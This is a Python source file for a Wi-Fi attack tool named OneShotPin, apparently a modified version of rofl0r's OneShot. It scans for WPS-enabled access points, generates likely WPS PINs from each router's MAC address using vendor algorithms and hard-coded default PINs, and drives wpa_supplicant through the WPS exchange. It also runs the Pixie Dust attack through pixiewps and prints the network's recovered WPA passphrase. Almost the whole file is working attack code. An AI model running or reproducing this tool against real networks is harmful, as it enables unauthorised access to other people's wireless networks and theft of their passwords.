#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs


class WPSException(Exception):
    pass


class WPSpin(object):
    '''WPS pin generator'''
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {}
        self.algos['pin24'] = {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24}
        self.algos['pin28'] = {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28}
        self.algos['pin32'] = {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32}
        self.algos['pinDLink'] = {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink}
        self.algos['pinDLink1'] = {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1}
        self.algos['pinASUS'] = {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS}
        self.algos['pinAirocon'] = {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon}
        # Static pin algos
        self.algos['pinEmpty'] = {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}
        self.algos['pinCisco'] = {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567}
        self.algos['pinBrcm1'] = {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252}
        self.algos['pinBrcm2'] = {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484}
        self.algos['pinBrcm3'] = {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990}
        self.algos['pinBrcm4'] = {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714}
        self.algos['pinBrcm5'] = {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411}
        self.algos['pinBrcm6'] = {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719}
        self.algos['pinAirc1'] = {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203}
        self.algos['pinAirc2'] = {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225}
        self.algos['pinDSL2740R'] = {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554}
        self.algos['pinRealtek1'] = {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146}
        self.algos['pinRealtek2'] = {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911}
        self.algos['pinRealtek3'] = {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371}
        self.algos['pinUpvel'] = {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483}
        self.algos['pinUR814AC'] = {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768}
        self.algos['pinUR825AC'] = {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417}
        self.algos['pinOnlime'] = {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604}
        self.algos['pinEdimax'] = {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153}
        self.algos['pinThomson'] = {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814}
        self.algos['pinHG532x'] = {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928}
        self.algos['pinH108L'] = {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988}
        self.algos['pinONO'] = {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}

    def _parseMAC(self, mac):
        mac = mac.replace(':', '').replace('-', '').replace('.', '')
        mac = int(mac, 16)
        return mac

    def _parseOUI(self, mac):
        mac = mac.replace(':', '').replace('-', '').replace('.', '')
        oui = int(mac[:6], 16)
        return oui

    def checksum(self, pin):
        '''
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        '''
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return ((10 - accum % 10) % 10)

    def generate(self, algo, mac):
        '''
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        '''
        mac = self._parseMAC(mac)
        if algo not in self.algos:
            raise WPSException('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getSuggested(self, mac):
        '''
        Get all suggested WPS pin's for single MAC
        '''
        algos = self.suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        '''
        Get all suggested WPS pin's for single MAC as list
        '''
        algos = self.suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def suggest(self, mac):
        '''
        Get algos suggestions for single MAC
        Returns the algo ID
        '''
        oui = self._parseOUI(mac)
        algorithms = {
            'pin24': (3318, 5329, 7391, 7967, 8821, 8951, 9819, 9934, 26187, 40998, 45068, 57376, 311149, 528501, 555596, 558651, 941390, 1080303, 1354211, 1358184, 1365581, 1867493, 2099437, 2108353, 2150192, 2631773, 2762845, 3180336, 3322588, 3435475, 3455642, 3676006, 4213251, 5021439, 5041630, 5135694, 5269488, 6048937, 6071197, 6091947, 6431549, 6438116, 6438399, 6443988, 6444444, 6450131, 6454622, 6461119, 6465764, 6469254, 6471791, 6473247, 6473492, 6474664, 6475198, 6482043, 6559472, 6582274, 6862543, 6954343, 6955837, 6957149, 6962687, 6968276, 6968732, 6974419, 6978910, 6985407, 6990052, 6996079, 6997535, 6997780, 6998952, 6999486, 7000414, 7000423, 7478631, 7480125, 7486692, 7486975, 7492564, 7493020, 7498707, 7503198, 7509695, 7514340, 7520367, 7521823, 7522068, 7523240, 7523774, 7524702, 7530619, 7891593, 7900663, 8396546, 8702386, 8971179, 9329998, 9475300, 9496250, 10000337, 10548161, 11151453, 11552890, 11580124, 11683580, 11834446, 12325889, 12383877, 12888093, 13122101, 13134983, 13393230, 13524302, 13921884, 13942655, 14183657, 14216087, 14446916, 14696758, 14732110, 14827830, 14828534, 14974201, 15256877, 15345757, 15475517, 15483894, 15518512, 15614966, 15905500, 16031731, 16259687, 16302225, 16306449, 16545046, 16577832, 16708904),
            'pin28': (2100167, 4736763, 13920936, 16272063),
            'pin32': (1830, 1073899, 1097544, 1366761, 1859371, 2927397, 3179945, 3179945, 4779532, 5260893, 5506214, 8396546, 8398473, 9473400, 13131776, 14221027, 15256600, 16018692, 16550807),
            'pinDLink': (5329, 1365581, 1867493, 2625659, 8702386, 10529563, 12100486, 12624059, 13414997, 14216087, 16545046),
            'pinDLink1': (5329, 6375, 6491, 7408, 7768, 8593, 8880, 9217, 9818, 1365581, 1867493, 3409924, 6085016, 8702386, 12100486, 13155865, 13161379, 13414997),
            'pinASUS': (1830, 1830, 6012, 6012, 7846, 12367, 57420, 298296, 299558, 528503, 528504, 528505, 540253, 548974, 549478, 1080132, 1097544, 1098619, 1113837, 1367465, 1580664, 1852441, 1869612, 1881900, 2367687, 2391840, 2905820, 2927397, 2948513, 3168826, 3179945, 3681354, 3724615, 3939844, 4200062, 4256257, 4516317, 4779532, 5260893, 5530841, 5546064, 5552138, 5798889, 6309323, 6333516, 6345130, 6574462, 6609236, 7084431, 7107104, 7142841, 7359867, 7365304, 7655467, 7873711, 7885870, 7920031, 8136292, 8404829, 8692771, 8955590, 8968182, 9179348, 9209899, 9456970, 9466498, 9500242, 9763762, 10247310, 10492713, 10548161, 11073504, 11280907, 11312663, 11313683, 11562687, 12080400, 12119566, 12334080, 12359296, 12381819, 12624059, 12849909, 12888093, 13131776, 13144569, 13635289, 13637570, 13665456, 14176486, 14221027, 14696265, 14991085, 15242486, 15256600, 15473241, 15475328, 15486029, 15759705, 16001107, 16006753, 16018415, 16265956, 16296709, 16312579, 16550807),
            'pinAirocon': (1830, 2859, 3828, 4915, 6012, 6895, 57419, 135192, 528499, 528503, 1053678, 2927397, 7900244, 8404829, 9763762, 12359296, 16006753, 16550807),
            'pinEmpty': (3727, 19063, 825023, 1073899, 1097461, 1859371, 2159523, 2921855, 3427818, 3725359, 3971186, 5553747, 5821806, 6558572, 6856950, 7351842, 7380781, 7645070, 7648638, 7658202, 7897346, 7902388, 7902850, 8141139, 8398473, 8966772, 9201864, 9742263, 9966387, 10278467, 10529563, 11330069, 13160798, 13280102, 13656204, 13902114, 13918435, 13924074, 14704742, 14970643, 15475328),
            'pinCisco': (6699, 9356, 9752, 3427819, 7369148, 14707093, 14732110),
            'pinBrcm1': (6825, 1315915, 9997149, 11334111, 12383877, 13161379, 15491684),
            'pinBrcm2': (1365581, 1867493, 2625659, 8702386, 12100486, 12383877, 13155865),
            'pinBrcm3': (1365581, 1867493, 2625659, 8127308, 12100486, 12383877, 13155865),
            'pinBrcm4': (1365581, 1597996, 1867493, 2117247, 2625659, 4986859, 8127448, 8702386, 12100486, 12383877, 13155865, 13161379, 13414997, 14183657, 16545046),
            'pinBrcm5': (1365581, 1597996, 1867493, 2117247, 2625659, 4986859, 8127448, 8702386, 12100486, 12383877, 13155865, 13161379, 13414997, 14183657, 16545046),
            'pinBrcm6': (1365581, 1597996, 1867493, 2117247, 2625659, 4986859, 8127448, 8702386, 12100486, 12383877, 13155865, 13161379, 13414997, 14183657, 16545046),
            'pinAirc1': (1580664, 4256257, 4516317, 13665456),
            'pinAirc2': (8692771, 8955590, 9179348),
            'pinDSL2740R': (9818, 1883577, 3409924, 6085016, 8702386, 16545046),
            'pinRealtek1': (3138, 3816, 5329),
            'pinRealtek2': (29283, 14991085),
            'pinRealtek3': (575155,),
            'pinUpvel': (16302225,),
            'pinUR814AC': (13942655,),
            'pinUR825AC': (13942655,),
            'pinOnlime': (5329, 7881846, 13942655, 16302225),
            'pinEdimax': (57420, 8396546),
            'pinThomson': (9764, 4469448, 8976327, 13370362),
            'pinHG532x': (26187, 549729, 555596, 825023, 1358184, 2099437, 2386341, 3435475, 7891593, 8971179, 10273138, 11330069, 13410851, 13662901, 15256877, 16253203, 16268799),
            'pinH108L': (4983220, 5024778, 10277451, 11564501, 13132999, 14418574, 16566423),
            'pinONO': (6042939, 14439292)
        }
        res = []
        for ID, OUI in algorithms.items():
            if oui in OUI:
                res.append(ID)
        return res

    def pin24(self, mac):
        return (mac & 0xFFFFFF)

    def pin28(self, mac):
        return (mac & 0xFFFFFFF)

    def pin32(self, mac):
        return (mac % 0x100000000)

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        return self.pinDLink(mac + 1)

    def pinASUS(self, mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        b = []
        for i in range(0, 12, 2):
            b.append(int(mac[i:i+2], 16))
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        b = []
        for i in range(0, 12, 2):
            b.append(int(mac[i:i+2], 16))
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


class Data():
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.wpa_psk = ''
        self.state = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class Options():
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.pin = None
        self.essid = None
        self.pixiemode = False
        self.full_range = False
        self.showpixiecmd = False
        self.verbose = False


def shellcmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
    result = proc.stdout.read()
    proc.wait()
    return result


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def run_wpa_supplicant(options):
    options.tempdir = tempfile.mkdtemp()
    with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
        temp.write("ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(options.tempdir))
        options.tempconf = temp.name
    cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(options.interface, options.tempconf)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    return proc


def run_wpa_cli(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, encoding='utf-8')
    recvuntil(proc, '\n>')
    return proc


def wps_reg(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    command = 'wps_reg {} {}\nquit\n'.format(options.bssid, options.pin)
    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, encoding='utf-8')
    status = False
    if 'OK' in proc.stdout:
        status = True
    return status


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
    if res.returncode == 0:
        return True
    else:
        return False


def statechange(data, old, new):
    data.state = new
    return True


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


def process_wpa_supplicant(pipe, options, data):
    line = pipe.stdout.readline()
    if line == '':
        pipe.wait()
        return False
    line = line.rstrip('\n')

    if options.verbose: sys.stderr.write(line + '\n')

    if line.startswith('WPS: '):
        if 'Building Message M' in line:
            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
            print('[*] Sending WPS Message {}...'.format(data.state))
        elif 'Received M' in line:
            statechange(data, data.state, 'M' + line.split('Received M')[1])
            print('[*] Received WPS Message {}'.format(data.state))
        elif 'Received WSC_NACK' in line:
            statechange(data, data.state, 'WSC_NACK')
            print('[*] Received WSC NACK')
        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            data.e_nonce = get_hex(line)
            assert(len(data.e_nonce) == 16*2)
            if options.pixiemode: print('[P] E-Nonce: {}'.format(data.e_nonce))
        elif 'DH own Public Key' in line and 'hexdump' in line:
            data.pkr = get_hex(line)
            assert(len(data.pkr) == 192*2)
            if options.pixiemode: print('[P] PKR: {}'.format(data.pkr))
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            data.pke = get_hex(line)
            assert(len(data.pke) == 192*2)
            if options.pixiemode: print('[P] PKE: {}'.format(data.pke))
        elif 'AuthKey' in line and 'hexdump' in line:
            data.authkey = get_hex(line)
            assert(len(data.authkey) == 32*2)
            if options.pixiemode: print('[P] AuthKey: {}'.format(data.authkey))
        elif 'E-Hash1' in line and 'hexdump' in line:
            data.e_hash1 = get_hex(line)
            assert(len(data.e_hash1) == 32*2)
            if options.pixiemode: print('[P] E-Hash1: {}'.format(data.e_hash1))
        elif 'E-Hash2' in line and 'hexdump' in line:
            data.e_hash2 = get_hex(line)
            assert(len(data.e_hash2) == 32*2)
            if options.pixiemode: print('[P] E-Hash2: {}'.format(data.e_hash2))
        elif 'Network Key' in line and 'hexdump' in line:
            data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
            statechange(data, data.state, 'GOT_PSK')

    elif ': State: ' in line:
        statechange(data, *line.split(': State: ')[1].split(' -> '))
        if '-> SCANNING' in line:
            print('[*] Scanning...')
    elif 'WPS-FAIL' in line:
        statechange(data, data.state, 'WPS-FAIL')
    elif 'NL80211_CMD_DEL_STATION' in line:
        print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
    elif 'Trying to authenticate with' in line:
        if 'SSID' in line: options.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
        print('[*] Authenticating...')
    elif 'Authentication response' in line:
        print('[+] Authenticated')
    elif 'Trying to associate with' in line:
        if 'SSID' in line: options.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
        print('[*] Associating with AP...')
    elif 'Associated with' in line and options.interface in line:
        if options.essid:
            print('[+] Associated with {} (ESSID: {})'.format(options.bssid, options.essid))
        else:
            print('[+] Associated with {}'.format(options.bssid))
    elif 'EAPOL: txStart' in line:
        statechange(data, data.state, 'EAPOL Start')
        print('[*] Sending EAPOL Start...')
    elif 'EAP entering state IDENTITY' in line:
        print('[*] Received Identity Request')
    elif 'using real identity' in line:
        print('[*] Sending Identity Response...')

    return True


def poll_wpa_supplicant(wpas, options, data):
    while True:
        res = process_wpa_supplicant(wpas, options, data)

        if not res:
            break
        if data.state == 'WSC_NACK':
            print('[-] Error: wrong PIN code')
            break
        elif data.state == 'GOT_PSK':
            break
        elif data.state == 'WPS-FAIL':
            print('[-] WPS-FAIL error')
            break
    if data.wpa_psk:
        return True
    if data.got_all():
        return True
    return False


def connect(options, data):
    print('[*] Running wpa_supplicant...')
    ifaceUp(options.interface)
    wpas = run_wpa_supplicant(options)

    try:
        while True:
            s = recvuntil(wpas, '\n')
            if options.verbose: sys.stderr.write(s)
            if 'update_config=1' in s:
                break
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        ifaceUp(options.interface, down=True)
        sys.exit(1)

    print('[*] Trying PIN "{}"...'.format(options.pin))
    wps_reg(options)

    try:
        res = poll_wpa_supplicant(wpas, options, data)
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        ifaceUp(options.interface, down=True)
        sys.exit(1)
    cleanup(wpas, options)
    ifaceUp(options.interface, down=True)
    return res


def wifi_scan(iface):
    '''Parsing iw scan results'''
    def handle_network(line, result, networks):
        networks.append(
                {
                    'Security type': 'Unknown',
                    'WPS': False,
                    'WPS locked': False,
                    'Model': '',
                    'Model number': '',
                    'Device name': ''
                 }
            )
        networks[-1]['BSSID'] = result.group(1).upper()

    def handle_essid(line, result, networks):
        d = result.group(1)
        networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    def handle_level(line, result, networks):
        networks[-1]['Level'] = int(float(result.group(1)))

    def handle_securityType(line, result, networks):
        sec = networks[-1]['Security type']
        if result.group(1) == 'capability':
            if 'Privacy' in result.group(2):
                sec = 'WEP'
            else:
                sec = 'Open'
        elif sec == 'WEP':
            if result.group(1) == 'RSN':
                sec = 'WPA2'
            elif result.group(1) == 'WPA':
                sec = 'WPA'
        elif sec == 'WPA':
            if result.group(1) == 'RSN':
                sec = 'WPA/WPA2'
        elif sec == 'WPA2':
            if result.group(1) == 'WPA':
                sec = 'WPA/WPA2'
        networks[-1]['Security type'] = sec

    def handle_wps(line, result, networks):
        networks[-1]['WPS'] = result.group(1)

    def handle_wpsLocked(line, result, networks):
        flag = int(result.group(1), 16)
        if flag:
            networks[-1]['WPS locked'] = True

    def handle_model(line, result, networks):
        d = result.group(1)
        networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    def handle_modelNumber(line, result, networks):
        d = result.group(1)
        networks[-1]['Model number'] =  codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    def handle_deviceName(line, result, networks):
        d = result.group(1)
        networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8')

    cmd = 'iw dev {} scan'.format(iface)
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, encoding='utf-8')
    lines = proc.stdout.splitlines()
    networks = []
    matchers = {
        re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
        re.compile(r'SSID: (.*)'): handle_essid,
        re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
        re.compile(r'(capability): (.+)'): handle_securityType,
        re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
        re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
        re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
        re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
        re.compile(r' [*] Model: (.*)'): handle_model,
        re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
        re.compile(r' [*] Device name: (.*)'): handle_deviceName
    }

    for line in lines:
        line = line.strip('\t')
        for regexp, handler in matchers.items():
            res = re.match(regexp, line)
            if res:
                handler(line, res, networks)

    # Filtering non-WPS networks
    networks = list(filter(lambda x: bool(x['WPS']), networks))
    # Sorting by signal level
    networks.sort(key=lambda x: x['Level'], reverse=True)
    return networks


def scanner_pretty_print(networks, vuln_list=[]):
    '''Printing WiFiScan result as table'''
    def truncateStr(s, l):
        '''
        Truncate string with the specified length
        @s — input string
        @l — length of output string
        '''
        if len(s) > l:
            k = l - 3
            s = s[:k] + '...'
        return s

    def colored(text, color=None):
        '''Returns colored text'''
        if color:
            if color == 'green':
                text = '\033[92m{}\033[00m'.format(text)
            elif color == 'red':
                text = '\033[91m{}\033[00m'.format(text)
            else:
                return text
        else:
            return text
        return text
    if vuln_list:
        print(colored('Green', color='green'), '— possible vulnerable network',
              '\n' + colored('Red', color='red'), '— WPS locked')
    print('Networks list:')
    print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
        '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
    for i, network in enumerate(networks):
        number = '{})'.format(i + 1)
        model = '{} {}'.format(network['Model'], network['Model number'])
        essid = truncateStr(network['ESSID'], 25)
        deviceName = truncateStr(network['Device name'], 27)
        line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            number, network['BSSID'], essid,
            network['Security type'], network['Level'],
            deviceName, model
            )
        if network['WPS locked']:
            print(colored(line, color='red'))
        elif model in vuln_list:
            print(colored(line, color='green'))
        else:
            print(line)


def suggest_network(options, vuln_list):
    networks = wifi_scan(options.interface)
    if not networks:
        die('No networks found.')
    scanner_pretty_print(networks, vuln_list)
    while 1:
        networkNo = input('Select target: ')
        try:
            if networkNo.lower() == 'r':
                return suggest_network(options, vuln_list)
            elif int(networkNo) in range(1, len(networks)+1):
                options.bssid = networks[int(networkNo) - 1]['BSSID']
            else:
                raise IndexError
        except Exception:
            print('Invalid number')
        else:
            break


def suggest_wpspin(options):
    pins = wpsGen.getSuggested(options.bssid)
    if len(pins) > 1:
        print('WPS PIN list:')
        print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
        for i, pin in enumerate(pins):
            number = '{})'.format(i + 1)
            line = '{:<3} {:<10} {:<}'.format(
                number, pin['pin'], pin['name'])
            print(line)
        while 1:
            pinNo = input('Select target: ')
            try:
                if int(pinNo) in range(1, len(pins)+1):
                    options.pin = pins[int(pinNo) - 1]['pin']
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')
            else:
                break
    elif len(pins) == 1:
        pin = pins[0]
        print('The only probable pin code is selected:', pin['name'])
        options.pin = pin['pin']
    else:
        options.pin = '12345670'


def parse_pixiewps(output):
    lines = output.splitlines()
    for line in lines:
        if ('[+]' in line) and ('WPS' in line):
            pin = line.split(':')[-1].strip()
            return pin
    return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    die("""
OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg

{} <arguments>

Required Arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional Arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -F, --force              : Run Pixiewps with --force option (bruteforce full range)
    -X                       : Alway print Pixiewps command
    -v                       : Verbose output

Example:
    {} -i wlan0 -b 00:90:4C:C1:AC:21 -K
""".format(sys.argv[0], sys.argv[0]))


def cleanup(wpas, options):
    wpas.terminate()
    shutil.rmtree(options.tempdir, ignore_errors=True)
    os.remove(options.tempconf)


if __name__ == '__main__':
    VULNWSCFILE = 'vulnwsc.txt'
    options = Options()
    wpsGen = WPSpin()

    import getopt
    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XFKv", ["help", "interface", "bssid", "pin", "force", "pixie-dust"])
    for a, b in optlist:
        if a in ('-i', "--interface"): options.interface = b
        elif a in ('-b', "--bssid"): options.bssid = b.upper()
        elif a in ('-p', "--pin"): options.pin = b
        elif a in ('-K', "--pixie-dust"): options.pixiemode = True
        elif a in ('-F', "--force"): options.full_range = True
        elif a in ('-X'): options.showpixiecmd = True
        elif a in ('-v'): options.verbose = True
        elif a == '--help': usage()
    if os.getuid() != 0:
        die("Run it as root")
    if not options.interface:
        die("Please specify interface name (-i) (use --help for usage)")
    if not ifaceUp(options.interface):
        die('Unable to up interface "{}"'.format(options.interface))
    if not options.bssid:
        print('BSSID not specified (--bssid) — scanning for available networks...')
        try:
            with open(VULNWSCFILE, 'r') as file:
                vuln_list = file.read().splitlines()
        except FileNotFoundError:
            vuln_list = []
        try:
            suggest_network(options, vuln_list)
        except KeyboardInterrupt:
            ifaceUp(options.interface, down=True)
            die('\nAborting...')
    if options.pin is None:
        if options.pixiemode:
            suggested_pins = wpsGen.getSuggestedList(options.bssid)
            if suggested_pins:
                options.pin = suggested_pins[0]
            else:
                options.pin = '12345670'
        else:
            suggest_wpspin(options)

    data = Data()
    connect(options, data)

    if data.wpa_psk:
        print("[+] WPS PIN: '{}'".format(options.pin))
        print("[+] WPA PSK: '{}'".format(data.wpa_psk))
        print("[+] AP SSID: '{}'".format(options.essid))
        sys.exit(0)

    elif data.got_all() and options.pixiemode:
        pixiecmd = data.get_pixie_cmd(options.full_range)
        print("Running Pixiewps...")
        if options.verbose or options.showpixiecmd: print("Cmd: {}".format(pixiecmd))
        out = shellcmd(pixiecmd)
        print(out)
        a = parse_pixiewps(out)
        if a and a != '<empty>':
            options.pin = a
            options.pixiemode = False
            data.clear()
            print('[+] Trying to get WPA PSK with the correct PIN...'.format(options.pin))
            connect(options, data)

            if data.wpa_psk:
                print("[+] WPS PIN: '{}'".format(options.pin))
                print("[+] WPA PSK: '{}'".format(data.wpa_psk))
                print("[+] AP SSID: '{}'".format(options.essid))
                sys.exit(0)
            sys.exit(1)
    elif options.pixiemode:
        print('[!] No enough data to run Pixie Dust attack')
        sys.exit(1)

    sys.exit(1)
